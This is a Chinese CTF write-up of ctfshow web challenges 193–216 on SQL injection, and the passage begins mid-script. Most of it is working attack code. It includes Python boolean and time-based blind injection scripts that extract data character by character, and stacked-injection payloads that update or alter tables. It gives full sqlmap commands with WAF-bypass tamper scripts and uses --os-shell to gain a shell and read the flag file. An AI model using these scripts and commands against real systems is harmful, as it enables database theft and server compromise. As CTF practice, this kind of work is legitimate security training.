all_str = "0123456789abcdefghijklmnopqrstuvwxyz-,_{}"

for i in range(1,99):
    for j in all_str:
        #payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        #payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg'"
        payload = "select group_concat(f1ag) from ctfshow_flxg"
        username_data = "admin' and if(({0})regexp('^{1}'), 1, 0)=1#".format(payload, flag + j)
        data = {'username': username_data,
                'password': 1}
        res = requests.post(url=url, data=data)
        #print(data)
        if "密码错误" in res.json()['msg']:
            flag += j
            print(flag)
            break
        if j == "}":
            exit()
```

## web194（布尔注入，过滤了left、right，用mid()或者正则）

```php
  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }

  //TODO:感觉少了个啥，奇怪
    if(preg_match('/file|into|ascii|ord|hex|substr|char|left|right|substring/i', $username)){
        $ret['msg']='用户名非法';
        die(json_encode($ret));
    }
```

这个题又双叒叕把上一题的姿势过滤掉了，想了好一会，最后翻文档发现还有个mid函数，用法和substr一样
poc：

```python
'''
Author: KonDream
Date: 2021-12-09 23:43:36
LastEditors:  KonDream
LastEditTime: 2021-12-09 23:45:02
Description:  
'''
import requests

url = 'http://a889051d-cd2f-452a-aa92-ef2ff1e555b4.challenge.ctf.show/api/'

flag = '' 
# 爆数据库名 ctfshow_flxg,ctfshow_user
# payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# 爆表名 id,f1ag
# payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg'"
# 爆字段
payload = "select f1ag from ctfshow_flxg"


for i in range(1, 46):
    # 查找ascii从32-128的所有字符
    low = 32
    high = 128
    # 二分查找 提升效率
    while True:
        mid = (low + high) >> 1
        if low == mid:  # low处对应字符即为数据库中的字符
            flag += str(chr(mid + 1))
            print('[*] {}'.format(flag))
            break

        data = {
            # 如果某个字符比如c大于chr(99),则返回1，否则返回0，根据回显不同最终确定某位置的某字符
            'username':"1' or if(mid(({}), {}, 1) > '{}', 1, 0)-- -".format(payload, i, chr(mid)),
            'password':1
        }
        r = requests.post(url=url, data=data)
        # print(r.text)
        if r'\u5bc6\u7801\u9519\u8bef' in r.text: #返回'查询失败'证明匹配成功
            low = mid # 查询成功，区间向右靠拢
        else:
            high = mid # 查询失败，区间向左靠拢
```

## web195（堆叠注入）

> 堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。

作者：dawsonenjoy
链接：https://www.jianshu.com/p/c50ced83414d

```php
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username};";

  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }

  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if(preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }
```

明示考察堆叠注入，同时需要成功登录才能获取flag，看了查询字段知道了pass字段，考虑将表中的密码改为我们想要的：payload：0;update`ctfshow_user`set`pass`=1234
![image.png](assets/1639065476545-61e5d6dd-f15e-4850-9711-40f4d43b80c4.png)

## web196（堆叠注入）

```php
  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if(preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  if(strlen($username)>16){
    $ret['msg']='用户名不能超过16个字符';
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }
```

这题纯纯坑人，后台并没有ban select。。
![image.png](assets/1639065895276-c53590b9-cb52-40d6-8c71-79655b808010.png)

## web197（堆叠注入）

```php
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username};";

  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set//i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }
```

通过堆叠注入知道返回逻辑是，我们输入的密码等于我们构造的sql语句执行结果。
而通过第2行知道表名是ctfshow_user，所以可以构造在username把表全部查询出来，在password里传入表名，相等即可符合判断条件爆出flag
![image.png](assets/1639148465876-0b9a5884-249c-40c4-b71f-4b8f4f95f2c7.png)

## web198（堆叠注入）

```php
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username};";

  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }
```

依然可用上题payload打，但这里换另一个思路去解，这里没有ban掉alter，我们可以把密码和id两列进行一个互换，这样一来判断flag的条件变成对id的检测，而id都是纯数字，我们可以去进行爆破到正确的id，从而获得flag，脚本如下

```python
#-- coding:UTF-8 --
# Author:dota_st
# Date:2021/6/15 22:53
# blog: www.wlhhlc.top
import requests

url = "http://e36a9275-a8a8-4def-bce5-0988a2b9b81d.challenge.ctf.show:8080/api/"
payload = '0x61646d696e;alter table ctfshow_user change column `pass` `dotast` varchar(255);alter table ctfshow_user change column `id` `pass` varchar(255);alter table ctfshow_user change column `dotast` `id` varchar(255);'
data1 = {
    'username': payload,
    'password': '1'
}
res = requests.post(url=url, data=data1)

for i in range(99):
    data2 = {
        'username': "0x61646d696e",
        'password': f'{i}'
    }
    res2 = requests.post(url=url, data=data2)
    if "flag" in res2.json()['msg']:
        print(res2.json()['msg'])
        break
```



## web199（堆叠注入）

```php
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username};";

  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }
```

然并卵，同上

## web200（堆叠注入）

```php
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username};";

  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(|\,/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }
```

同上

## web201（sqlmap referer）

![image.png](assets/1639205328367-52a2be30-3421-46d6-b1d0-36e77e0bfdae.png)
提示使用--referer绕过referer字段检查
payload：

```sql
sqlmap -u http://ccbeb5de-bb83-49ad-bb0c-3c3951b90561.challenge.ctf.show/api?id=1 --referer="http://ccbeb5de-bb83-49ad-bb0c-3c3951b90561.challenge.ctf.show/sqlmap.php" --batch -D ctfshow_web -T ctfshow_user -C pass --dump
```

## web202（sqlmap post）

![image.png](assets/1639205851777-360226cc-82ca-40be-9db8-28c43338871a.png)
提示说变更请求方法，那应该就是id=1变为post方式
payload：

```sql
sqlmap -u http://89db3d5f-7b86-4646-829e-352b2bca63ab.challenge.ctf.show/api/ --data="id=1" --referer="http://89db3d5f-7b86-4646-829e-352b2bca63ab.challenge.ctf.show/sqlmap.php" --batch -D ctfshow_web -T ctfshow_user -C pass --dump
```

## web203（sqlmap --method）

> 使用--method 调整sqlmap的请求方式,记得加上设置`Content-Type`头，否则会变成表单提交

```sql
python3 sqlmap.py -u http://952c1d6e-8980-44b7-bd8f-26be8e8da314.challenge.ctf.show/api/index.php --method=put --data="id=1" --headers="content-type:text/plain" --referer="http://e626647d-5cb2-4d05-800a-fbf7e74b952a.challenge.ctf.show/sqlmap.php" --batch -D ctfshow_web -T ctfshow_user -C pass --dump
```

--method=put 是以put方式提交数据
--headers="content-type:text/plain" 是指定提交方式，以免变成键值对put无法接收

## web204（sqlmap --cookie）

加上--cookie即可,cookie自己抓包拿

## web205（sqlmap --safe-url）

![image-20231113110347627](assets/image-20231113110347627.png)

观察发现在访问/api/index.php前，会访问一次/api/getToken.php

> --safe-url 设置在测试目标地址前访问的安全链接 
> --safe-freq 设置两次注入测试前访问安全链接的次数

```sql
python3 sqlmap.py -u http://c0be6c77-8736-413a-8556-aad9653872d6.challenge.ctf.show/api/index.php --method=put --data="id=1" --headers="content-type:text/plain" --referer="http://5b6df0bc-df17-4d42-ade2-d0c97d2929a4.challenge.ctf.show/sqlmap.php" --safe-url="http://c0be6c77-8736-413a-8556-aad9653872d6.challenge.ctf.show/api/getToken.php" --safe-freq=1 --cookie="PHPSESSID=f5p6fnun7km8v9k5pnsq26imic" --batch -D ctfshow_web -T ctfshow_flax --dump
```

## web206（sqlmap --safe-url）

需要闭合，同上

```sql
sqlmap -u http://561398b1-68e3-4976-8c87-ad558b762bb4.challenge.ctf.show/api/index.php --method=put --data="id=1" --headers="content-type:text/plain" --referer="http://561398b1-68e3-4976-8c87-ad558b762bb4.challenge.ctf.show/sqlmap.php" --safe-url="http://561398b1-68e3-4976-8c87-ad558b762bb4.challenge.ctf.show/api/getToken.php" --safe-freq=1 --cookie="UM_distinctid=17d0a9bdbc07e4-0fff9a495dfe88-57b1a33-144000-17d0a9bdbc1cdd; PHPSESSID=tako5u4s3isfemao7eu9h72r8o" --batch -D ctfshow_web -T ctfshow_flaxc --dump
```

## web207（sqlmap --tamper space2comment）

开始进入编写tamper的时代啦！
首先观察返回逻辑，可以看到正则对空格进行了过滤

```
CODE
//对传入的参数进行了过滤
  function waf($str){
   return preg_match('/ /', $str);
  }
```

遇到这种情况怎么办？sqlmap提供了tamper脚本用于应对此种情况，tamper的出现是为了引入用户自定义的脚本来修改payload以达到绕过waf的目的。sqlmap自带的tamper脚本文件都在sqlmap的tamper文件夹下

> 举例如下tamper脚本：
>
> [apostrophemask.py](http://apostrophemask.py/) 用utf8代替引号
>
> [equaltolike.py](http://equaltolike.py/) MSSQL * SQLite中like 代替等号
>
> [greatest.py](http://greatest.py/) MySQL中绕过过滤’>’ ,用GREATEST替换大于号
>
> [space2hash.py](http://space2hash.py/) 空格替换为#号 随机字符串 以及换行符
>
> [space2comment.py](http://space2comment.py/) 用/**/代替空格
>
> [apostrophenullencode.py](http://apostrophenullencode.py/) MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，替换字符和双引号
>
> [halfversionedmorekeywords.py](http://halfversionedmorekeywords.py/) 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论
>
> [space2morehash.py](http://space2morehash.py/) MySQL中空格替换为 #号 以及更多随机字符串 换行符
>
> appendnullbyte.p Microsoft Access在有效负荷结束位置加载零字节字符编码
>
> [ifnull2ifisnull.py](http://ifnull2ifisnull.py/) MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤
>
> [space2mssqlblank.py](http://space2mssqlblank.py/) mssql空格替换为其它空符号
>
> [base64encode.py](http://base64encode.py/) 用base64编码
>
> [space2mssqlhash.py](http://space2mssqlhash.py/) mssql查询中替换空格
>
> [modsecurityversioned.py](http://modsecurityversioned.py/) mysql中过滤空格，包含完整的查询版本注释
>
> [space2mysqlblank.py](http://space2mysqlblank.py/) mysql中空格替换其它空白符号
>
> [between.py](http://between.py/) MS SQL 2005，MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（>）
>
> [space2mysqldash.py](http://space2mysqldash.py/) MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）
>
> [multiplespaces.py](http://multiplespaces.py/) 围绕SQL关键字添加多个空格
>
> [space2plus.py](http://space2plus.py/) 用+替换空格
>
> [bluecoat.py](http://bluecoat.py/) MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like
>
> [nonrecursivereplacement.py](http://nonrecursivereplacement.py/) 双重查询语句。取代predefined SQL关键字with表示 suitable for替代
>
> [space2randomblank.py](http://space2randomblank.py/) 代替空格字符（“”）从一个随机的空白字符可选字符的有效集
>
> sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的26 有效载荷的末尾
>
> [chardoubleencode.py](http://chardoubleencode.py/) 双url编码(不处理以编码的)
>
> [unionalltounion.py](http://unionalltounion.py/) 替换UNION ALL SELECT UNION SELECT
>
> [charencode.py](http://charencode.py/) Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0url编码；
>
> [randomcase.py](http://randomcase.py/) Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0中随机大小写
>
> [unmagicquotes.py](http://unmagicquotes.py/) 宽字符绕过 GPC addslashes
>
> [randomcomments.py](http://randomcomments.py/) 用/**/分割sql关键字
>
> [charunicodeencode.py](http://charunicodeencode.py/) ASP，ASP.NET中字符串 unicode 编码
>
> [securesphere.py](http://securesphere.py/) 追加特制的字符串
>
> [versionedmorekeywords.py](http://versionedmorekeywords.py/) MySQL >= 5.1.13注释绕过
>
> [halfversionedmorekeywords.py](http://halfversionedmorekeywords.py/) MySQL < 5.1中关键字前加注释

对于本题，过滤了空格，我们可以使用tamper文件夹下的space2comment.py文件，payload为

```
CODE
python3 sqlmap.py -u "http://04ac3359-1e07-4234-aa4c-992636c78c51.challenge.ctf.show:8080/api/index.php" --data="id=1" --method=PUT --referer="ctf.show" --headers="Content-Type:text/plain" --safe-url="http://04ac3359-1e07-4234-aa4c-992636c78c51.challenge.ctf.show:8080/api/getToken.php" --safe-freq=1 --tamper=space2comment --dbs
```

那我们如何编写自己的tamper脚本呢？我们查看一下space2comment.py文件的内容

```python
PYTHON
#!/usr/bin/env python

"""
Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces space character (' ') with comments '/**/'

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass weak and bespoke web application firewalls

    >>> tamper('SELECT id FROM users')
    'SELECT/**/id/**/FROM/**/users'
    """

    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += "/**/"
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                retVal += "/**/"
                continue

            retVal += payload[i]

    return retVal
```

可以看到，tamper函数中把空格替换成`/**/`，我们把他换成`%09`来进行绕过空格，新建一个`dotast.py`，稍作改变

```python
PYTHON
#!/usr/bin/env python

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):

    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += chr(0x9)
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                retVal += chr(0x9)
                continue

            retVal += payload[i]

    return retVal
```

引用的tamper名字就是我们刚刚定义的dotast

```shell
CODE
python3 sqlmap.py -u "http://04ac3359-1e07-4234-aa4c-992636c78c51.challenge.ctf.show:8080/api/index.php" --data="id=1" --method=PUT --referer="ctf.show" --headers="Content-Type:text/plain" --safe-url="http://04ac3359-1e07-4234-aa4c-992636c78c51.challenge.ctf.show:8080/api/getToken.php" --safe-freq=1 --tamper=dotast -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump
```



## web208（sqlmap --tamper space2comment）

过滤了小写的select，问题不大，sqlmap使用的是大写Orz

```sql
sqlmap -u http://a4ac5964-6598-492a-9a4c-a63931c35518.challenge.ctf.show/api/index.php --method=put --data="id=1" --headers="content-type:text/plain" --batch --safe-url="http://a4ac5964-6598-492a-9a4c-a63931c35518.challenge.ctf.show/api/getToken.php" --safe-freq=1 --cookie="UM_distinctid=17d0a9bdbc07e4-0fff9a495dfe88-57b1a33-144000-17d0a9bdbc1cdd; PHPSESSID=p6t1dc1tff53dqvuckatsmlnse" --referer="http://a4ac5964-6598-492a-9a4c-a63931c35518.challenge.ctf.show/sqlmap.php" --tamper=space2comment.py -D ctfshow_web -T ctfshow_flaxcac --dump
```

## web209（sqlmap --tamper 自己编写脚本 space20a）

```php
//对传入的参数进行了过滤
  function waf($str){
   //TODO 未完工
   return preg_match('/ |\*|\=/', $str);
  }
```

过滤了空格、*、和等号，前两个可以通过%0a绕过，等号可以通过like绕过，sqlmap中没有一个脚本同时可以满足这两个要求（使用多个除外），这里选择自己写个脚本，用来绕过：space20a.py

```python
#!/usr/bin/env python

"""
Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces space character (' ') with comments 'chr(0x0a)'

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass weak and bespoke web application firewalls

    >>> tamper('SELECT id FROM users')
    'SELECT/**/id/**/FROM/**/users'
    """

    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += chr(0x0a)
                    continue
            
            elif payload[i] == "=":
                retVal += chr(0x0a)+"LIKE"+chr(0x0a)
                continue
                
            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote     

            elif payload[i] == " " and not doublequote and not quote:
                retVal += chr(0x0a)
                continue

            retVal += payload[i]

    return retVal

```

payload：

```sql
sqlmap -u http://d1669260-f0e8-47e6-93fc-716d2e6a2aa5.challenge.ctf.show/api/index.php --method=put --data="id=1" --headers="content-type:text/plain" --batch --safe-url="http://d1669260-f0e8-47e6-93fc-716d2e6a2aa5.challenge.ctf.show/api/getToken.php" --safe-freq=1 --cookie="UM_distinctid=17d0a9bdbc07e4-0fff9a495dfe88-57b1a33-144000-17d0a9bdbc1cdd; PHPSESSID=io8p0l7mvkf5j5n0slb1339pmr" --referer="http://d1669260-f0e8-47e6-93fc-716d2e6a2aa5.challenge.ctf.show/sqlmap.php" --tamper=space20a.py -D ctfshow_web -T ctfshow_flav --dump
```

## web210（sqlmap --tamper base64_reverse）

```php
//对查询字符进行解密
  function decode($id){
    return strrev(base64_decode(strrev(base64_decode($id))));
  }
```

观察到需要对传入字符串进行反转->b64encode->反转->b64encode，这样解密过后就会形成注入
自编sqlmap脚本：dotast.py

```python
#!/usr/bin/env python

"""
Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
import base64

__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage("别套了别套了")

def tamper(payload, **kwargs):

    retVal = payload

    if payload:
        retVal = retVal.encode()
        retVal = retVal[::-1]
        retVal = base64.b64encode(retVal)
        retVal = retVal[::-1]
        retVal = base64.b64encode(retVal)
        retVal = retVal.decode()

    return retVal

```

payload：

```sql
sqlmap -u http://8d7939fb-e94b-42c5-9958-9e12e356d27b.challenge.ctf.show/api/index.php --method=put --data="id=1" --headers="content-type:text/plain" --batch --safe-url="http://8d7939fb-e94b-42c5-9958-9e12e356d27b.challenge.ctf.show/api/getToken.php" --safe-freq=1 --cookie="UM_distinctid=17d0a9bdbc07e4-0fff9a495dfe88-57b1a33-144000-17d0a9bdbc1cdd; PHPSESSID=kvugtg72oirlau35bd7sp47lft" --referer="http://8d7939fb-e94b-42c5-9958-9e12e356d27b.challenge.ctf.show/sqlmap.php" --tamper=dotast.py -D ctfshow_web -T ctfshow_flavi --dump
```

## web211（sqlmap --tamper base64_reverse）

```php
//对查询字符进行解密
  function decode($id){
    return strrev(base64_decode(strrev(base64_decode($id))));
  }
function waf($str){
    return preg_match('/ /', $str);
}
```

多过滤了空格，不过base64后也没有空格，或者使用/**/代替也行，同上
payload：

```sql
sqlmap -u http://0bbd2e83-d166-48d7-bf6f-e1cc1757f23c.challenge.ctf.show/api/index.php --method=put --data="id=1" --headers="content-type:text/plain" --batch --safe-url="http://0bbd2e83-d166-48d7-bf6f-e1cc1757f23c.challenge.ctf.show/api/getToken.php" --safe-freq=1 --cookie="UM_distinctid=17d0a9bdbc07e4-0fff9a495dfe88-57b1a33-144000-17d0a9bdbc1cdd; PHPSESSID=kvugtg72oirlau35bd7sp47lft" --referer="http://0bbd2e83-d166-48d7-bf6f-e1cc1757f23c.challenge.ctf.show/sqlmap.php" --tamper=space2comment.py,base64_reverse.py -D ctfshow_web -T ctfshow_flavia --dump
```

## web212（sqlmap --tamper base64_reverse）

```php
//对查询字符进行解密
  function decode($id){
    return strrev(base64_decode(strrev(base64_decode($id))));
  }
function waf($str){
    return preg_match('/ |\*/', $str);
}
```

过滤了空格外还过滤了*，可以使用%0a绕过，脚本同web209，但是要删除等号的替换，防止对base64结果造成影响
payload：

```sql
sqlmap -u http://6042e5b9-06e2-4e2e-be35-331c4ea7bd10.challenge.ctf.show/api/index.php --method=put --data="id=1" --headers="content-type:text/plain" --batch --safe-url="http://6042e5b9-06e2-4e2e-be35-331c4ea7bd10.challenge.ctf.show/api/getToken.php" --safe-freq=1 --cookie="UM_distinctid=17d0a9bdbc07e4-0fff9a495dfe88-57b1a33-144000-17d0a9bdbc1cdd; PHPSESSID=0bs54hboh98dsq24ct61otlnch" --referer="http://6042e5b9-06e2-4e2e-be35-331c4ea7bd10.challenge.ctf.show/sqlmap.php" --tamper=space20a.py,base64_reverse.py -D ctfshow_web -T ctfshow_flavis --dump
```

## web213（sqlmap --os-shell）

```sql
练习使用--os-shell 一键getshell
```

题目和上个题一样，提示说使用--os-shell，那么就是正常姿势，先查找注入点：

```sql
sqlmap -u http://6dbfae24-2cec-463d-b96c-45fd34fb84fc.challenge.ctf.show/api/index.php --method=put --data="id=1" --headers="content-type:text/plain" --batch --safe-url="http://6dbfae24-2cec-463d-b96c-45fd34fb84fc.challenge.ctf.show/api/getToken.php" --safe-freq=1 --cookie="UM_distinctid=17d0a9bdbc07e4-0fff9a495dfe88-57b1a33-144000-17d0a9bdbc1cdd; PHPSESSID=0bs54hboh98dsq24ct61otlnch" --referer="http://6dbfae24-2cec-463d-b96c-45fd34fb84fc.challenge.ctf.show/sqlmap.php" --tamper=space20a.py,base64_reverse.py
```

使用--os-shell一个条件就是当前用户必须有root权限，所以查看一下：

```sql
sqlmap -u http://6dbfae24-2cec-463d-b96c-45fd34fb84fc.challenge.ctf.show/api/index.php --method=put --data="id=1" --headers="content-type:text/plain" --batch --safe-url="http://6dbfae24-2cec-463d-b96c-45fd34fb84fc.challenge.ctf.show/api/getToken.php" --safe-freq=1 --cookie="UM_distinctid=17d0a9bdbc07e4-0fff9a495dfe88-57b1a33-144000-17d0a9bdbc1cdd; PHPSESSID=0bs54hboh98dsq24ct61otlnch" --referer="http://6dbfae24-2cec-463d-b96c-45fd34fb84fc.challenge.ctf.show/sqlmap.php" --tamper=space20a.py,base64_reverse.py --is-dba --current-user
```

![image.png](assets/1639584220972-6a045834-613c-495a-ae85-76f9da962a19.png)
符合预期，然后就是--os-shell

```sql
sqlmap -u http://6dbfae24-2cec-463d-b96c-45fd34fb84fc.challenge.ctf.show/api/index.php --method=put --data="id=1" --headers="content-type:text/plain" --batch --safe-url="http://6dbfae24-2cec-463d-b96c-45fd34fb84fc.challenge.ctf.show/api/getToken.php" --safe-freq=1 --cookie="UM_distinctid=17d0a9bdbc07e4-0fff9a495dfe88-57b1a33-144000-17d0a9bdbc1cdd; PHPSESSID=0bs54hboh98dsq24ct61otlnch" --referer="http://6dbfae24-2cec-463d-b96c-45fd34fb84fc.challenge.ctf.show/sqlmap.php" --tamper=space20a.py,base64_reverse.py --os-shell
```

我这里只成功了一个，没有直接弹shell
![image.png](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/assets/1639584340830-582eb7d8-51bc-41f5-9bca-d0a3b2a91216.png)
访问一下这个页面
![image.png](assets/1639584369317-b79989f7-a8da-4872-b835-00040a662dfb.png)
是sqlmap构造的一个文件上传，方便我们传码然后getshell
![image.png](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/assets/1639584452743-ba29464e-4f70-4f73-89ea-a5e0857de742.png)
这里也是直接getshell了，最后就是找flag：system('cat /ctfshow_flag');
![image.png](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/assets/1639584525211-f738b064-c1be-426c-aff0-b23bedfdceba.png)

## web214（时间盲注）

这个题重点是在找注入点，比较点进去时间盲注啥也没有，看了大师傅的wp发现在index.php页面中有个这样的js文件：
![image.png](assets/1639586812633-a6e28a26-074c-4f33-b7f8-1032ec4c2a55.png)
向api/index.php发送了post请求，然后测试发现是ip字段存在时间盲注，时间盲注和布尔盲注原理基本是一样的，举个例子：ip=1 or if(1=0,1,sleep(1))-- -很明显1=0是不正确的，那么就会执行sleep(1)，发现页面进入等待，1s多后出现回显，这就是简单的一种时间盲注，所以我们构造payload去查询一些字段，比如数据库名表名等等，然后根据页面响应时间的长短判断是否正确，进而爆破出答案，上脚本：

```python
'''
Author: KonDream
Date: 2021-12-16 00:31:18
LastEditors:  KonDream
LastEditTime: 2021-12-16 00:52:23
Description:  
'''
import requests

url = "http://0be5cdb6-57e9-4049-8635-e6abcddd8027.challenge.ctf.show/api/index.php"

flag = '' 
# 爆数据库名 ctfshow_flagx,ctfshow_info
# payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# 爆表名 id,flaga,info
# payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'"
# 爆字段
payload = "select flaga from ctfshow_flagx"

for i in range(1, 46):
    # 查找ascii从32-128的所有字符
    low = 32
    high = 128
    # 二分查找 提升效率
    while True:
        mid = (low + high) >> 1
        if low == mid:  # low处对应字符即为数据库中的字符
            flag += str(chr(mid + 1))
            print('[*] {}'.format(flag))
            break

        data = {
            # 二分法查找字符，ascii值大则sleep
            'ip' : "1 or if(ascii(substr(({}), {}, 1)) > {}, sleep(1), 1)-- -".format(payload, i, mid),
            'debug' : 1
        }

        r = requests.post(url=url, data=data)
        r = r.elapsed.total_seconds() # 获取页面响应时间

        if r > 1: #响应时间超过1s，证明查询成功
            low = mid # 查询成功，区间向右靠拢
        else:
            high = mid # 查询失败，区间向左靠拢
```

## web215（时间盲注）

思路同上，这个题payload要闭合单引号

```python
'''
Author: KonDream
Date: 2021-12-16 00:59:13
LastEditors:  KonDream
LastEditTime: 2021-12-16 01:02:36
Description:  
'''
import requests

url = "http://deb6375d-362d-49f7-8626-00484b436b5a.challenge.ctf.show/api/index.php"

flag = '' 
# 爆数据库名 ctfshow_flagxc,ctfshow_info
# payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# 爆表名 id,flagaa,info
# payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'"
# 爆字段
payload = "select flagaa from ctfshow_flagxc"

for i in range(1, 46):
    # 查找ascii从32-128的所有字符
    low = 32
    high = 128
    # 二分查找 提升效率
    while True:
        mid = (low + high) >> 1
        if low == mid:  # low处对应字符即为数据库中的字符
            flag += str(chr(mid + 1))
            print('[*] {}'.format(flag))
            break

        data = {
            # 二分法查找字符，ascii值大则sleep
            'ip' : "1' or if(ascii(substr(({}), {}, 1)) > {}, sleep(1), 1)-- -".format(payload, i, mid),
            'debug' : 1
        }

        r = requests.post(url=url, data=data)
        r = r.elapsed.total_seconds() # 获取页面响应时间

        if r > 1: #响应时间超过1s，证明查询成功
            low = mid # 查询成功，区间向右靠拢
        else:
            high = mid # 查询失败，区间向左靠拢
```

## web216（时间盲注）

先随便传个参看看是什么回显
